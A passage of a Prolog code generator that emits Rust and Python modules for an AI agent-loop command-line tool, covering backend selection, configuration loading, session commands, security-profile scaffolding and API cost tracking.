    write(S, '    match config.backend.as_str() {\n'),
    maplist([FN]>>(
        resolve_factory_backend(FN, Props),
        backend_factory(FN, FProps),
        (member(type(cli), Props) ->
            (member(command(Cmd), Props) -> true ; atom_string(FN, Cmd)),
            %% Build CLI args array: use cli_args from factory facts if present
            (member(cli_args(CliArgs), FProps) ->
                maplist([A,Q]>>(format(atom(Q), '"~w"', [A])), CliArgs, Quoted),
                atomic_list_concat(Quoted, ', ', ArgsStr),
                format(atom(ArgsLit), '&[~w]', [ArgsStr])
            ;
                ArgsLit = '&[]'
            ),
            (member(default_model(Model), Props) ->
                format(S, '        "~w" => Box::new(CliBackend::new("~w", "~w", ~w, Some("~w".to_string()))),~n', [FN, FN, Cmd, ArgsLit, Model])
            ;
                format(S, '        "~w" => Box::new(CliBackend::new("~w", "~w", ~w, config.model.clone())),~n', [FN, FN, Cmd, ArgsLit])
            )
        ; member(type(api), Props) ->
            (member(endpoint(EP), Props) -> true ; EP = ''),
            %% Determine API format from auth_header property
            (member(auth_header("x-api-key"), Props) -> ApiFmt = anthropic ; ApiFmt = openai),
            (member(auth_env(AuthEnv), Props) ->
                format(S, '        "~w" => {~n', [FN]),
                format(S, '            let key = std::env::var("~w").ok().or(config.api_key.clone());~n', [AuthEnv]),
                (member(default_model(DefModel), Props) ->
                    format(S, '            let model = config.model.clone().unwrap_or("~w".to_string());~n', [DefModel])
                ;
                    format(S, '            let model = config.model.clone().unwrap_or_default();~n', [])
                ),
                format(S, '            Box::new(ApiBackend::new("~w", "~w", key, &model, config.stream, "~w"))~n', [FN, EP, ApiFmt]),
                format(S, '        }~n', [])
            ;
                (member(default_model(DefModel2), Props) ->
                    format(S, '        "~w" => Box::new(ApiBackend::new("~w", "~w", None, &config.model.clone().unwrap_or("~w".to_string()), config.stream, "~w")),~n', [FN, FN, EP, DefModel2, ApiFmt])
                ;
                    format(S, '        "~w" => Box::new(ApiBackend::new("~w", "~w", None, &config.model.clone().unwrap_or_default(), config.stream, "~w")),~n', [FN, FN, EP, ApiFmt])
                )
            )
        ; true  %% skip unknown types
        )
    ), Order),
    write(S, '        _ => panic!("Unknown backend: {}", config.backend),\n'),
    write(S, '    }\n'),
    write(S, '}\n\n').

generate_rust_tool_handler :-
    output_path(rust, 'tool_handler.rs', Path),
    open(Path, write, S),
    write_rust_header(S, tool_handler, 'Tool execution and security validation'),
    write(S, 'use std::process::{Command, Stdio};\n'),
    write(S, 'use crate::types::*;\n\n'),
    write_rust(S, tool_handler_struct),
    write_rust(S, tool_handler_validation),
    write_rust(S, tool_handler_dispatch),
    close(S),
    format('  Generated rust/src/tool_handler.rs~n', []).

generate_rust_config_loader :-
    output_path(rust, 'config_loader.rs', Path),
    open(Path, write, S),
    write_rust_header(S, config_loader, 'Config file loading, agent resolution, API key lookup'),
    write_rust(S, config_loader_types),
    write_rust(S, config_loader_cascade),
    write_rust(S, config_loader_agent_resolve),
    write_rust(S, config_loader_api_key_resolve),
    write_rust(S, config_loader_list_agents),
    %% Generate example config from example_agent_config/3 facts
    generate_rust_example_config(S),
    generate_rust_example_config_yaml(S),
    close(S),
    format('  Generated rust/src/config_loader.rs~n', []).

%% generate_rust_example_config(+Stream)
%% Emit generate_example_config() function from example_agent_config/3 facts.
generate_rust_example_config(S) :-
    write(S, '\nfn generate_example_config() -> String {\n'),
    write(S, '    let mut s = String::new();\n'),
    write(S, '    s.push_str(\"{\\n\");\n'),
    write(S, '    s.push_str(\"  \\\"agents\\\": {\\n\");\n'),
    findall(Name-Backend-Opts, example_agent_config(Name, Backend, Opts), Examples),
    length(Examples, Len),
    rust_emit_example_agents(S, Examples, 1, Len),
    write(S, '    s.push_str(\"  }\\n\");\n'),
    write(S, '    s.push_str(\"}\\n\");\n'),
    write(S, '    s\n'),
    write(S, '}\n').

rust_emit_example_agents(_, [], _, _).
rust_emit_example_agents(S, [Name-Backend-Opts|Rest], Idx, Total) :-
    format(S, '    s.push_str(\"    \\\"~w\\\": {\\n\");\n', [Name]),
    format(S, '    s.push_str(\"      \\\"backend\\\": \\\"~w\\\"', [Backend]),
    (Opts == [] ->
        (Idx < Total ->
            write(S, '\\n\");\n')
        ;
            write(S, '\\n\");\n')
        )
    ;
        write(S, ',\\n\");\n'),
        rust_emit_example_opts(S, Opts)
    ),
    (Idx < Total ->
        write(S, '    s.push_str(\"    },\\n\");\n')
    ;
        write(S, '    s.push_str(\"    }\\n\");\n')
    ),
    Idx2 is Idx + 1,
    rust_emit_example_agents(S, Rest, Idx2, Total).

rust_emit_example_opts(_, []).
rust_emit_example_opts(S, [Key=Val]) :- !,
    rust_format_config_val(Val, FmtVal),
    format(S, '    s.push_str(\"      \\\"~w\\\": ~w\\n\");\n', [Key, FmtVal]).
rust_emit_example_opts(S, [Key=Val|Rest]) :-
    rust_format_config_val(Val, FmtVal),
    format(S, '    s.push_str(\"      \\\"~w\\\": ~w,\\n\");\n', [Key, FmtVal]),
    rust_emit_example_opts(S, Rest).

rust_format_config_val(Val, FmtStr) :-
    (Val == true -> FmtStr = 'true'
    ; Val == false -> FmtStr = 'false'
    ; number(Val) -> term_to_atom(Val, FmtStr)
    ; is_list(Val) ->
        maplist([V, Quoted]>>(
            format(atom(Quoted), '\\\"~w\\\"', [V])
        ), Val, QuotedList),
        atomic_list_concat(QuotedList, ', ', Inner),
        format(atom(FmtStr), '[~w]', [Inner])
    ; format(atom(FmtStr), '\\\"~w\\\"', [Val])
    ).

%% generate_rust_example_config_yaml(+Stream)
%% Emit generate_example_config_yaml() that reuses generate_example_config()
%% and converts JSON → YAML via serde.
generate_rust_example_config_yaml(S) :-
    write(S, '\nfn generate_example_config_yaml() -> String {\n'),
    write(S, '    let json_str = generate_example_config();\n'),
    write(S, '    match serde_json::from_str::<serde_json::Value>(&json_str) {\n'),
    write(S, '        Ok(val) => serde_yaml::to_string(&val).unwrap_or(json_str),\n'),
    write(S, '        Err(_) => json_str,\n'),
    write(S, '    }\n'),
    write(S, '}\n').

generate_rust_sessions :-
    output_path(rust, 'sessions.rs', Path),
    open(Path, write, S),
    write_rust_header(S, sessions, 'Session persistence — save, load, list, delete'),
    write_rust(S, sessions_module),
    close(S),
    format('  Generated rust/src/sessions.rs~n', []).

generate_rust_main :-
    output_path(rust, 'main.rs', Path),
    open(Path, write, S),
    write_rust_header(S, main, 'CLI entry point and agent loop'),
    write(S, 'use agent_loop::types::*;\n'),
    write(S, 'use agent_loop::backends::*;\n'),
    write(S, 'use agent_loop::context::*;\n'),
    write(S, 'use agent_loop::costs::*;\n'),
    write(S, 'use agent_loop::tool_handler::*;\n'),
    write(S, 'use agent_loop::commands::*;\n'),
    write(S, 'use agent_loop::sessions::*;\n'),
    write(S, 'use agent_loop::config_loader::*;\n\n'),
    %% Data-driven command dispatch function (with session support)
    generate_rust_command_dispatch_with_sessions(S),
    write(S, 'fn main() {\n'),
    %% Clap argument parsing
    write(S, '    let matches = clap::Command::new("uwsal")\n'),
    write(S, '        .about("UnifyWeaver Agent Loop")\n'),
    write(S, '        .version(env!("CARGO_PKG_VERSION"))\n'),
    generate_rust_clap_args(S),
    write(S, '        .get_matches();\n\n'),
    %% Config file loading + agent resolution
    write(S, '    // Load config file\n'),
    write(S, '    let no_fallback = matches.get_flag("no_fallback");\n'),
    write(S, '    let cli_config = matches.get_one::<String>("config").map(|s| s.as_str());\n'),
    write(S, '    let config_path = find_config_file(cli_config, no_fallback);\n'),
    write(S, '    let config_file = config_path.as_deref().and_then(|p| load_config_file(p));\n\n'),
    %% Handle --init-config (early return)
    write(S, '    // Handle --init-config\n'),
    write(S, '    if let Some(path) = matches.get_one::<String>("init_config") {\n'),
    write(S, '        if let Err(e) = init_config(path) {\n'),
    write(S, '            eprintln!("Error creating config: {}", e);\n'),
    write(S, '        }\n'),
    write(S, '        return;\n'),
    write(S, '    }\n\n'),
    %% Handle --list-agents (early return)
    write(S, '    // Handle --list-agents\n'),
    write(S, '    if matches.get_flag("list_agents") {\n'),
    write(S, '        list_agents(config_file.as_ref());\n'),
    write(S, '        return;\n'),
    write(S, '    }\n\n'),
    %% Resolve agent variant
    write(S, '    // Resolve agent variant\n'),
    write(S, '    let agent_name = matches.get_one::<String>("agent").map(|s| s.as_str());\n'),
    write(S, '    let mut config = resolve_agent(agent_name, config_file.as_ref());\n\n'),
    %% Apply CLI overrides on top
    write(S, '    // Apply CLI overrides on top of agent config\n'),
    generate_rust_cli_config_build(S),
    %% Resolve API key
    write(S, '    // Resolve API key\n'),
    write(S, '    resolve_api_key(&mut config, config_file.as_ref());\n\n'),
    %% Session manager setup
    write(S, '    let sessions_dir = matches.get_one::<String>("sessions_dir").map(|s| s.as_str());\n'),
    write(S, '    let session_manager = SessionManager::new(sessions_dir);\n\n'),
    %% Handle pre-loop actions (--list-sessions, --session, --search, --prompt)
    write(S, '    // Handle --list-sessions\n'),
    write(S, '    if matches.get_flag("list_sessions") {\n'),
    write(S, '        let sessions = session_manager.list();\n'),
    write(S, '        if sessions.is_empty() {\n'),
    write(S, '            println!("No saved sessions.");\n'),
    write(S, '        } else {\n'),
    write(S, '            for s in &sessions {\n'),
    write(S, '                println!("{} | {} | {} | {} msgs", s.id, s.name, s.backend, s.message_count);\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '        return;\n'),
    write(S, '    }\n\n'),
    %% Handle --search
    write(S, '    // Handle --search\n'),
    write(S, '    if let Some(query) = matches.get_one::<String>("search_arg") {\n'),
    write(S, '        let sessions = session_manager.list();\n'),
    write(S, '        let query_lower = query.to_lowercase();\n'),
    write(S, '        for s in &sessions {\n'),
    write(S, '            if s.name.to_lowercase().contains(&query_lower) || s.id.contains(&query_lower) {\n'),
    write(S, '                println!("{} | {} | {}", s.id, s.name, s.backend);\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '        return;\n'),
    write(S, '    }\n\n'),
    %% Handle --session (load at startup)
    write(S, '    // Handle --session (load at startup)\n'),
    write(S, '    let mut initial_context: Vec<Message> = Vec::new();\n'),
    write(S, '    if let Some(session_id) = matches.get_one::<String>("session") {\n'),
    write(S, '        if let Some(session) = session_manager.load(session_id) {\n'),
    write(S, '            initial_context = session.messages;\n'),
    write(S, '            println!("Loaded session: {} ({} messages)", session.metadata.name, session.metadata.message_count);\n'),
    write(S, '        } else {\n'),
    write(S, '            eprintln!("Session not found: {}", session_id);\n'),
    write(S, '        }\n'),
    write(S, '    }\n\n'),
    %% Main loop (expects `config`, `session_manager`, and `initial_context` to be defined)
    write_rust(S, main_loop),
    write(S, '}\n'),
    close(S),
    format('  Generated rust/src/main.rs~n', []).

%% generate_rust_command_dispatch(+Stream)
%% Emit command handler function from slash_command/4 facts.
generate_rust_command_dispatch(S) :-
    generate_rust_command_dispatch_with_sessions(S).

%% generate_rust_command_dispatch_with_sessions(+Stream)
%% Emit command handler with session management support.
generate_rust_command_dispatch_with_sessions(S) :-
    write(S, '/// Handle a slash command. Returns true if the command was handled.\n'),
    write(S, 'fn handle_command(\n'),
    write(S, '    input: &str,\n'),
    write(S, '    context: &mut ContextManager,\n'),
    write(S, '    cost_tracker: &CostTracker,\n'),
    write(S, '    session_manager: &SessionManager,\n'),
    write(S, '    backend_name: &str,\n'),
    write(S, ') -> bool {\n'),
    write(S, '    let parts: Vec<&str> = input.splitn(2, '' '').collect();\n'),
    write(S, '    let cmd = parts[0].trim_start_matches(''/'');\n'),
    write(S, '    let _arg = if parts.len() > 1 { parts[1].trim() } else { "" };\n'),
    write(S, '    match cmd {\n'),
    write(S, '        "exit" | "quit" => {\n'),
    write(S, '            // Auto-save on exit\n'),
    write(S, '            if context.len() > 0 {\n'),
    write(S, '                let id = session_manager.save(context.get_messages(), backend_name, None);\n'),
    write(S, '                println!("Session saved: {}", id);\n'),
    write(S, '            }\n'),
    write(S, '            println!("Goodbye!");\n'),
    write(S, '            std::process::exit(0);\n'),
    write(S, '        }\n'),
    write(S, '        "clear" => {\n'),
    write(S, '            context.clear();\n'),
    write(S, '            println!("Context cleared.");\n'),
    write(S, '        }\n'),
    write(S, '        "cost" | "costs" => {\n'),
    write(S, '            println!("{}", cost_tracker.format_summary());\n'),
    write(S, '        }\n'),
    write(S, '        "help" => {\n'),
    write(S, '            println!("Available commands:");\n'),
    write(S, '            for (name, spec) in SLASH_COMMANDS.iter() {\n'),
    write(S, '                println!("  /{:<15} {}", name, spec.help);\n'),
    write(S, '            }\n'),
    write(S, '            println!("  /{:<15} {}", "save [name]", "Save current session");\n'),
    write(S, '            println!("  /{:<15} {}", "load <id>", "Load a saved session");\n'),
    write(S, '            println!("  /{:<15} {}", "sessions", "List saved sessions");\n'),
    write(S, '            println!("  /{:<15} {}", "delete <id>", "Delete a saved session");\n'),
    write(S, '        }\n'),
    write(S, '        "status" => {\n'),
    write(S, '            println!("Context: {} messages", context.len());\n'),
    write(S, '            println!("{}", cost_tracker.format_summary());\n'),
    write(S, '        }\n'),
    write(S, '        "save" => {\n'),
    write(S, '            let name = if _arg.is_empty() { None } else { Some(_arg) };\n'),
    write(S, '            let id = session_manager.save(context.get_messages(), backend_name, name);\n'),
    write(S, '            println!("Session saved: {}", id);\n'),
    write(S, '        }\n'),
    write(S, '        "load" => {\n'),
    write(S, '            if _arg.is_empty() {\n'),
    write(S, '                println!("Usage: /load <session-id>");\n'),
    write(S, '            } else if let Some(session) = session_manager.load(_arg) {\n'),
    write(S, '                context.clear();\n'),
    write(S, '                for msg in &session.messages {\n'),
    write(S, '                    context.add_message(&msg.role, &msg.content);\n'),
    write(S, '                }\n'),
    write(S, '                println!("Loaded session: {} ({} messages)", session.metadata.name, session.metadata.message_count);\n'),
    write(S, '            } else {\n'),
    write(S, '                println!("Session not found: {}", _arg);\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '        "sessions" => {\n'),
    write(S, '            let sessions = session_manager.list();\n'),
    write(S, '            if sessions.is_empty() {\n'),
    write(S, '                println!("No saved sessions.");\n'),
    write(S, '            } else {\n'),
    write(S, '                for s in &sessions {\n'),
    write(S, '                    println!("{} | {} | {} | {} msgs", s.id, s.name, s.backend, s.message_count);\n'),
    write(S, '                }\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '        "delete" => {\n'),
    write(S, '            if _arg.is_empty() {\n'),
    write(S, '                println!("Usage: /delete <session-id>");\n'),
    write(S, '            } else if session_manager.delete(_arg) {\n'),
    write(S, '                println!("Session deleted: {}", _arg);\n'),
    write(S, '            } else {\n'),
    write(S, '                println!("Session not found: {}", _arg);\n'),
    write(S, '            }\n'),
    write(S, '        }\n'),
    write(S, '        _ => {\n'),
    write(S, '            println!("Unknown command: /{}", cmd);\n'),
    write(S, '            return false;\n'),
    write(S, '        }\n'),
    write(S, '    }\n'),
    write(S, '    true\n'),
    write(S, '}\n\n').

%% generate_rust_clap_args(+Stream)
%% Emit clap Arg::new() calls from cli_argument/2 facts.
generate_rust_clap_args(S) :-
    findall(Name-Props, cli_argument(Name, Props), Args),
    maplist([Name-Props]>>(
        atom_string(Name, NameStr),
        format(S, '        .arg(clap::Arg::new("~w")', [NameStr]),
        %% Long flag (strip -- prefix)
        (member(long(Long), Props) ->
            (member(positional(true), Props) ->
                true  %% positional args don't get .long()
            ;
                atom_string(Long, LongStr),
                (sub_string(LongStr, 0, 2, _, "--") ->
                    sub_string(LongStr, 2, _, 0, LongName)
                ;
                    LongName = LongStr
                ),
                format(S, '~n            .long("~w")', [LongName])
            )
        ; true
        ),
        %% Short flag (strip - prefix)
        (member(short(Short), Props) ->
            atom_string(Short, ShortStr),
            (sub_string(ShortStr, 0, 1, _, "-") ->
                sub_string(ShortStr, 1, 1, 0, ShortChar)
            ;
                ShortChar = ShortStr
            ),
            format(S, '~n            .short(''~w'')', [ShortChar])
        ; true
        ),
        %% Help text
        (member(help(Help), Props) ->
            format(S, '~n            .help("~w")', [Help])
        ; true
        ),
        %% Default value (skip none)
        (member(default(Def), Props), Def \= none, Def \= [] ->
            term_to_atom(Def, DefAtom),
            format(S, '~n            .default_value("~w")', [DefAtom])
        ; true
        ),
        %% Choices
        (member(choices(Choices), Props) ->
            format(S, '~n            .value_parser([', []),
            rust_emit_choices_list(S, Choices),
            write(S, '])')
        ; true
        ),
        %% Action: store_true
        (member(action(store_true), Props) ->
            write(S, '\n            .action(clap::ArgAction::SetTrue)')
        ; true
        ),
        %% Nargs
        (member(nargs(Nargs), Props) ->
            (Nargs == '*' ->
                write(S, '\n            .num_args(0..)')
            ; Nargs == '?' ->
                write(S, '\n            .num_args(0..=1)')
            ; true
            )
        ; true
        ),
        %% Type: int
        (member(type(int), Props) ->
            write(S, '\n            .value_parser(clap::value_parser!(i64))')
        ; true
        ),
        %% Action: append
        (member(action(append), Props) ->
            write(S, '\n            .action(clap::ArgAction::Append)')
        ; true
        ),
        write(S, ')\n')
    ), Args).

%% Helper: emit comma-separated quoted choice list
rust_emit_choices_list(_, []).
rust_emit_choices_list(S, [C]) :- !,
    format(S, '"~w"', [C]).
rust_emit_choices_list(S, [C|Rest]) :-
    format(S, '"~w", ', [C]),
    rust_emit_choices_list(S, Rest).

%% generate_rust_cli_config_build(+Stream)
%% Emit code to build AgentConfig from clap matches.
generate_rust_cli_config_build(S) :-
    %% String overrides (str fields)
    maplist([Field-ArgName]>>(
        format(S, '    if let Some(v) = matches.get_one::<String>("~w") { config.~w = v.clone(); }~n', [ArgName, Field])
    ), [backend-backend]),
    %% Optional string overrides (str | None fields)
    maplist([Field-ArgName]>>(
        format(S, '    if let Some(v) = matches.get_one::<String>("~w") { config.~w = Some(v.clone()); }~n', [ArgName, Field])
    ), [model-model, api_key-api_key, system_prompt-system_prompt]),
    %% Bool flag overrides
    write(S, '    if matches.get_flag("auto_tools") { config.auto_tools = true; }\n'),
    write(S, '    if matches.get_flag("no_tokens") { config.show_tokens = false; }\n'),
    write(S, '    if matches.get_flag("stream_arg") { config.stream = true; }\n'),
    write(S, '    if matches.get_flag("no_security") { config.security_profile = "open".to_string(); }\n'),
    %% String overrides for security/approval
    maplist([Field-ArgName]>>(
        format(S, '    if let Some(v) = matches.get_one::<String>("~w") { config.~w = v.clone(); }~n', [ArgName, Field])
    ), [security_profile-security_profile, approval_mode-approval_mode]),
    %% Int overrides
    maplist([Field-ArgName]>>(
        format(S, '    if let Some(&v) = matches.get_one::<i64>("~w") { config.~w = v; }~n', [ArgName, Field])
    ), [max_iterations-max_iterations, max_context_tokens-max_tokens, max_chars-max_chars, max_words-max_words]),
    write(S, '\n').

%% Generate a single module by name
generate_module(backends_init)      :- generate_backends_init.
generate_module(backends_base)      :- generate_backends_base.
generate_module(security_init)      :- generate_security_init.
generate_module(security_profiles)  :- generate_security_profiles.
generate_module(costs)              :- generate_costs.
generate_module(tools_generated)    :- generate_tools.
generate_module(context)            :- generate_context.
generate_module(config)             :- generate_config.
generate_module(display)            :- generate_display.
generate_module(tools)              :- generate_tools_module.
generate_module(aliases)            :- generate_aliases.
generate_module(export)             :- generate_simple_module('export.py', export_module).
generate_module(history)            :- generate_simple_module('history.py', history_module).
generate_module(multiline)          :- generate_simple_module('multiline.py', multiline_module).
generate_module(retry)              :- generate_simple_module('retry.py', retry_module).
generate_module(search)             :- generate_simple_module('search.py', search_module).
generate_module(sessions)           :- generate_simple_module('sessions.py', sessions_module).
generate_module(skills)             :- generate_simple_module('skills.py', skills_module).
generate_module(templates)          :- generate_simple_module('templates.py', templates_module).
generate_module(security_audit)     :- generate_simple_module('security/audit.py', security_audit_module).
generate_module(security_proxy)     :- generate_simple_module('security/proxy.py', security_proxy_module).
generate_module(security_path_proxy):- generate_simple_module('security/path_proxy.py', security_path_proxy_module).
generate_module(security_proot_sandbox) :- generate_simple_module('security/proot_sandbox.py', security_proot_sandbox_module).
generate_module(agent_loop_main)     :- generate_agent_loop_main.
generate_module(readme)             :- generate_readme.

%% Simple module generator: write a single py_fragment to a file
generate_simple_module(FileName, FragmentName) :-
    output_path(python, FileName, Path),
    open(Path, write, S),
    write_py(S, FragmentName),
    close(S),
    %% Extract just the filename for display
    format('  Generated ~w~n', [FileName]).

%% =============================================================================
%% Generator: backends/__init__.py
%% =============================================================================

generate_backends_init :-
    output_path(python, 'backends/__init__.py', InitPath),
    open(InitPath, write, S),
    write(S, '# Auto-generated by agent_loop_module.pl\n'),
    write(S, 'from .base import AgentBackend, AgentResponse, ToolCall\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, backend_factory/2),
    nl(S),
    %% Direct imports (non-optional backends)
    agent_loop_components:emit_backend_init_imports(S, [target(python)]),
    %% __all__ — declarative via generator_export_specs
    nl(S),
    agent_loop_components:generator_export_specs(backends_init, BackendsExports),
    agent_loop_components:emit_export_specs(S, BackendsExports),
    %% Optional imports with try/except
    agent_loop_components:emit_backend_init_optional(S, [target(python)]),
    close(S),
    format('  Generated backends/__init__.py~n', []).


%% =============================================================================
%% Generator: backends/base.py
%% =============================================================================

generate_backends_base :-
    output_path(python, 'backends/base.py', BasePath),
    open(BasePath, write, S),
    write(S, '"""Abstract base class for agent backends."""\n\n'),
    agent_loop_components:generator_import_specs(backends_base, BaseImports),
    agent_loop_components:emit_import_specs(S, BaseImports),
    write(S, '\n\n'),
    %% ToolCall dataclass
    write(S, '@dataclass\n'),
    write(S, 'class ToolCall:\n'),
    write(S, '    """Represents a tool call from the agent."""\n'),
    write(S, '    name: str\n'),
    write(S, '    arguments: dict[str, Any]\n'),
    write(S, '    id: str = ""\n\n\n'),
    %% AgentResponse dataclass
    write(S, '@dataclass\n'),
    write(S, 'class AgentResponse:\n'),
    write(S, '    """Response from an agent backend."""\n'),
    write(S, '    content: str\n'),
    write(S, '    tool_calls: list[ToolCall] = field(default_factory=list)\n'),
    write(S, '    tokens: dict[str, int] = field(default_factory=dict)\n'),
    write(S, '    raw: Any = None\n\n\n'),
    %% AgentBackend ABC
    write(S, 'class AgentBackend(ABC):\n'),
    write(S, '    """Abstract interface for agent backends."""\n\n'),
    write(S, '    @abstractmethod\n'),
    write(S, '    def send_message(self, message: str, context: list[dict], **kwargs) -> AgentResponse:\n'),
    write(S, '        """Send a message with context, get response.\n\n'),
    write(S, '        Optional kwargs:\n'),
    write(S, '            on_status: Callback for status updates (e.g. tool call progress)\n'),
    write(S, '        """\n'),
    write(S, '        raise NotImplementedError\n\n'),
    write(S, '    def parse_tool_calls(self, response: str) -> list[ToolCall]:\n'),
    write(S, '        """Extract tool calls from response. Override in subclasses."""\n'),
    write(S, '        return []\n\n'),
    write(S, '    def supports_streaming(self) -> bool:\n'),
    write(S, '        """Whether this backend supports streaming output."""\n'),
    write(S, '        return False\n\n'),
    write(S, '    @property\n'),
    write(S, '    def name(self) -> str:\n'),
    write(S, '        """Backend name for display."""\n'),
    write(S, '        return self.__class__.__name__\n'),
    close(S),
    format('  Generated backends/base.py~n', []).

%% =============================================================================
%% Generator: security/__init__.py
%% =============================================================================

generate_security_init :-
    output_path(python, 'security/__init__.py', SecInitPath),
    open(SecInitPath, write, S),
    write(S, '"""Security subsystem for UnifyWeaver Agent Loop.\n\n'),
    write(S, 'Provides audit logging, enhanced security profiles, command proxying,\n'),
    write(S, 'PATH-based wrapper scripts, and proot filesystem isolation.\n'),
    write(S, '"""\n\n'),
    %% Imports — one import line per module, comma-separated exports
    agent_loop_components:emit_security_module_imports(S, [target(python)]),
    %% __all__ (declarative via generator_export_specs)
    write(S, '\n'),
    agent_loop_components:generator_export_specs(security_init, AllExports),
    agent_loop_components:emit_export_specs(S, AllExports),
    close(S),
    format('  Generated security/__init__.py~n', []).

%% =============================================================================
%% Generator: security/profiles.py
%% =============================================================================

generate_security_profiles :-
    output_path(python, 'security/profiles.py', ProfPath),
    open(ProfPath, write, S),
    write(S, '"""Enhanced security profiles for the agent loop.\n\n'),
    write(S, 'Each profile defines a complete security posture: what\'s blocked, what\'s\n'),
    write(S, 'proxied, what\'s logged, and what isolation is applied.\n'),
    write(S, '"""\n\n'),
    %% Imports (declarative via generator_import_specs)
    agent_loop_components:generator_import_specs(security_profiles, ProfImports),
    agent_loop_components:emit_import_specs(S, ProfImports),
    write(S, '\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, security_profile/2),
    nl(S),
    %% SecurityProfile dataclass — fields from declarative security_profile_field/4 facts
    write(S, '@dataclass\n'),
    write(S, 'class SecurityProfile:\n'),
    write(S, '    """Full security profile with all layer settings."""\n'),
    agent_loop_components:emit_security_profile_fields(S, [target(python)]),
    write(S, '\n\n'),
    %% Regex lists
    write(S, '# ── Built-in profiles ─────────────────────────────────────────────────────\n\n'),
    %% Emit regex lists — data-driven from regex_list_variable/2 facts
    findall(LN-PV, (regex_list_variable(LN, PV), regex_list(LN, _)), RLVars),
    maplist([LN-PV]>>(
        generate_regex_list_py(S, LN, PV),
        write(S, '\n')
    ), RLVars),
    %% Emit combined regex list variables
    findall(combo(CV, Src1, Src2), regex_list_combined(CV, Src1, Src2), Combos),
    maplist([combo(CV, Src1, Src2)]>>(
        write(S, '# Combined allowlist (safe + confirm)\n'),
        format(S, '~w = ~w + ~w~n~n~n', [CV, Src1, Src2])
    ), Combos),
    %% get_builtin_profiles()
    write(S, 'def get_builtin_profiles() -> dict[str, SecurityProfile]:\n'),
    write(S, '    """Return all built-in security profiles."""\n'),
    write(S, '    return {\n'),
    agent_loop_components:emit_security_profile_entries(S, [target(python)]),
    write(S, '    }\n\n\n'),
    %% get_profile()
    write(S, 'def get_profile(name: str) -> SecurityProfile:\n'),
    write(S, '    """Get a built-in profile by name, defaulting to cautious."""\n'),
    write(S, '    profiles = get_builtin_profiles()\n'),
    write(S, '    return profiles.get(name, profiles[\'cautious\'])\n'),
    close(S),
    format('  Generated security/profiles.py~n', []).

%% Write a regex_list as a Python list variable
generate_regex_list_py(S, ListName, PyVarName) :-
    regex_list(ListName, Patterns),
    format(S, '~w = [~n', [PyVarName]),
    maplist([P]>>(format(S, '    ~w,~n', [P])), Patterns),
    write(S, ']\n').

%% Write a single profile entry in get_builtin_profiles()
%% Data-driven from security_profile_field/4 facts.
generate_profile_entry(S, Name, Props) :-
    member(description(Desc), Props),
    format(S, '        \'~w\': SecurityProfile(~n', [Name]),
    format(S, '            name=\'~w\',~n', [Name]),
    format(S, '            description=\'~w\',~n', [Desc]),
    %% Iterate over all schema fields (skip name, description — already emitted)
    findall(FN-FType, (
        security_profile_field(FN, FType, _, _),
        FN \= name, FN \= description
    ), FieldSpecs),
    maplist([FN-FType]>>(emit_profile_field_if_present(S, FN, FType, Props)), FieldSpecs),
    write(S, '        ),\n').

%% emit_profile_field_if_present(+Stream, +FieldName, +FieldType, +Props)
%% Emit a field value if the profile has a matching property.
emit_profile_field_if_present(S, FieldName, FieldType, Props) :-
    functor(Prop, FieldName, 1),
    (member(Prop, Props) ->
        arg(1, Prop, Value),
        emit_profile_field_value(S, FieldName, FieldType, Value)
    ; true).

%% Type-dispatched value formatting
emit_profile_field_value(S, FieldName, 'bool', Value) :-
    py_bool(Value, PyVal),
    format(S, '            ~w=~w,~n', [FieldName, PyVal]).
emit_profile_field_value(S, FieldName, 'str', Value) :-
    format(S, '            ~w=\'~w\',~n', [FieldName, Value]).
emit_profile_field_value(S, FieldName, 'int | None', Value) :-
    format(S, '            ~w=~w,~n', [FieldName, Value]).
emit_profile_field_value(S, FieldName, 'list[str]', Value) :-
    %% List fields — look up Python variable name from declarative facts
    (regex_list_variable(Value, PyVar) ->
        format(S, '            ~w=list(~w),~n', [FieldName, PyVar])
    ;
        format(S, '            ~w=~w,~n', [FieldName, Value])
    ).

%% =============================================================================
%% Generator: costs.py
%% =============================================================================
%% --- Cost py_fragments ---

py_fragment(cost_usage_record, '@dataclass
class UsageRecord:
    """Record of a single API call."""
    timestamp: str
    model: str
    input_tokens: int
    output_tokens: int
    input_cost: float
    output_cost: float
    total_cost: float


').

py_fragment(cost_tracker_class_def, '@dataclass
class CostTracker:
    """Track API costs for a session."""

    pricing: dict = field(default_factory=lambda: DEFAULT_PRICING.copy())
    records: list[UsageRecord] = field(default_factory=list)
    total_input_tokens: int = 0
    total_output_tokens: int = 0
    total_cost: float = 0.0

').

py_fragment(cost_tracker_methods, '    def record_usage(self, model: str, input_tokens: int, output_tokens: int) -> UsageRecord:
        """Record token usage and calculate cost."""
        pricing = self.pricing.get(model, {"input": 0.0, "output": 0.0})
        input_cost = (input_tokens / 1_000_000) * pricing["input"]
        output_cost = (output_tokens / 1_000_000) * pricing["output"]
        total_cost = input_cost + output_cost
        record = UsageRecord(
            timestamp=datetime.now().isoformat(),
            model=model,
            input_tokens=input_tokens,
            output_tokens=output_tokens,
            input_cost=input_cost,
            output_cost=output_cost,
            total_cost=total_cost
        )
        self.records.append(record)
        self.total_input_tokens += input_tokens
        self.total_output_tokens += output_tokens
        self.total_cost += total_cost
        return record

    def get_summary(self) -> dict:
        """Get a summary of costs."""
        return {
            "total_requests": len(self.records),
            "total_input_tokens": self.total_input_tokens,
            "total_output_tokens": self.total_output_tokens,
            "total_tokens": self.total_input_tokens + self.total_output_tokens,
            "total_cost_usd": round(self.total_cost, 6),
            "cost_formatted": f"${self.total_cost:.4f}"
        }

    def format_status(self) -> str:
        """Format cost status for display."""
        summary = self.get_summary()
        return (
            f"Tokens: {summary[\'total_input_tokens\']:,} in / "
            f"{summary[\'total_output_tokens\']:,} out | "
            f"Cost: {summary[\'cost_formatted\']}"
        )

    def reset(self) -> None:
        """Reset all tracking."""
        self.records.clear()
        self.total_input_tokens = 0
        self.total_output_tokens = 0
        self.total_cost = 0.0

    def to_dict(self) -> dict:
        """Convert to dictionary for serialization."""
        return {
            "summary": self.get_summary(),
            "records": [
                {
                    "timestamp": r.timestamp,
                    "model": r.model,
                    "input_tokens": r.input_tokens,
